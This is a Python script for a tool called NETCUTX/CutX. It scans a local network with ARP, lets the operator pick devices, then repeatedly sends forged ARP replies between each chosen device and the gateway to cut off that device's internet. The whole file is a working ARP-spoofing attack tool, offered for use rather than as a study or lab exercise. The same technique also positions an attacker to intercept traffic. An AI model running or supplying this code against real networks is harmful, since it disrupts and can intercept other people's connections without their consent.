import os
try:
    from scapy.all import ARP, Ether, srp, send
    import time
    import threading
    from rich.console import Console
    from rich.table import Table
    from rich.panel import Panel

    import random
    import pyfiglet
    from termcolor import colored
    os.system('clear')
   
    network_ip = "192.168.0.0/24"
    gateway_ip = "192.168.0.1"


    ######################################################       
    font = pyfiglet.figlet_format("     CutX", font="slant")

    list_color = ['green','blue','cyan','yellow']
    list_color2 = ['light_green','light_blue','light_cyan','light_yellow']

    rand_color = random.choice(list_color)
    rand_color2 = random.choice(list_color2)

    print(colored('----------------------------------------------------------',rand_color2))
    print(colored(font,rand_color))
    print(colored('----------------------------------------------------------',rand_color2))

    running = False
    target_ips = [] 


    console = Console()


    def get_mac(ip):
        try:
            arp_request = ARP(pdst=ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request
            answered_list = srp(arp_request_broadcast, timeout=3, verbose=False)[0]

            if answered_list:
                return answered_list[0][1].hwsrc
            else:
                console.print(f"[-] Could not find MAC address for {ip}. Make sure the device is connected to the network.", style="red")
                return None
        except Exception as e:
            console.print(f"[-] Error while getting MAC address for {ip}: {str(e)}", style="red")
            return None



    def scan_network(network_ip):
        console.print("[*] Scanning the network, please wait...", style="cyan")
        devices = {}
        try:
            arp_request = ARP(pdst=network_ip)
            broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
            arp_request_broadcast = broadcast / arp_request

            for _ in range(3):
                answered_list = srp(arp_request_broadcast, timeout=5, verbose=False)[0]
                for element in answered_list:
                    devices[element[1].psrc] = element[1].hwsrc  

        except Exception as e:
            console.print(f"[-] Error while scanning network: {str(e)}", style="red")

        device_list = [{'ip': ip, 'mac': mac} for ip, mac in devices.items()]
        return device_list


 
    def display_devices(devices):
        if not devices:
            console.print("[-] No devices found on the network.", style="red")
            return

        table = Table(title="Connected Devices on the Network", show_header=True, header_style="bold magenta")
        table.add_column("No.", style="cyan", justify="center")
        table.add_column("IP Address", style="green")
        table.add_column("MAC Address", style="yellow")

        for index, device in enumerate(devices):
            table.add_row(str(index + 1), device['ip'], device['mac'])

        console.print(table)


 
    def spoof(target_ip, spoof_ip):
        target_mac = get_mac(target_ip)
        if target_mac is None:
            console.print(f"[-] Cannot spoof; MAC address for {target_ip} not found.", style="red")
            return

        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
        send(arp_response, verbose=False)


    def restore(target_ip, gateway_ip):
        target_mac = get_mac(target_ip)
        gateway_mac = get_mac(gateway_ip)

        if target_mac is None or gateway_mac is None:
            console.print("[-] Cannot restore connection; MAC address not found for one of the devices.", style="red")
            return

        arp_response = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip, hwsrc=gateway_mac)
        send(arp_response, count=4, verbose=False)


   
    def run_spoofing():
        global running
        while running:
            for target_ip in target_ips:
                spoof(target_ip, gateway_ip)
                spoof(gateway_ip, target_ip)
            time.sleep(2)



    def stop_spoofing():
        global running
        running = False
        for target_ip in target_ips:
            restore(target_ip, gateway_ip)
        console.print("[!] Spoofing stopped and connections restored.", style="cyan")



    def choose_devices(devices):
        display_devices(devices)
        try:
            choices = console.input("[blue]Enter the numbers of the devices to block (comma-separated): ").strip()
            selected_indices = [int(index.strip()) - 1 for index in choices.split(",")]
            
            global target_ips
            target_ips = [devices[index]['ip'] for index in selected_indices if 0 <= index < len(devices)]
            
            if target_ips:
                start_spoofing_thread()
            else:
                console.print("Invalid selection. Please try again.", style="red")
        except ValueError:
            console.print("Please enter valid numbers.", style="red")



    def start_spoofing_thread():
        global running
        running = True
        thread = threading.Thread(target=run_spoofing)
        thread.start()



    def user_input():
        while True:
            command = console.input("\n[light_blue]Enter ('stop' or 'S') to stop spoofing, ('scan' or 'sc') to scan the network, or ('exit' or 'E') to quit: ").strip().lower()
            if command in ['stop','s']:
                stop_spoofing()
            elif command in ['scan','sc']:
                devices = scan_network(network_ip)
                if devices:
                    choose_devices(devices)
                else:
                    console.print("[-] No devices found on the network.", style="red")
            elif command in ['exit','e']:
                if running:
                    stop_spoofing()
                console.print("[!] Exiting program.", style="cyan")
                break
            else:
                console.print("Unknown command. Use 'stop', 'scan', or 'exit'.", style="red")


 
    if __name__ == "__main__":
        console.print(Panel("[bold green]IT IS USED TO CUT OFF THE INTERNET ON DEVICES CONNECTED TO THE NETWORK", title="NETCUTX", style="magenta"))
        user_input()
except ImportError:
    c = input('models is not install\n\nDo you Auto installtion  models (Y/?)')
    if c.upper() == 'Y':
        os.system('pip install -r requirements.txt')

    else:
        print('pip install -r requirements.txt')
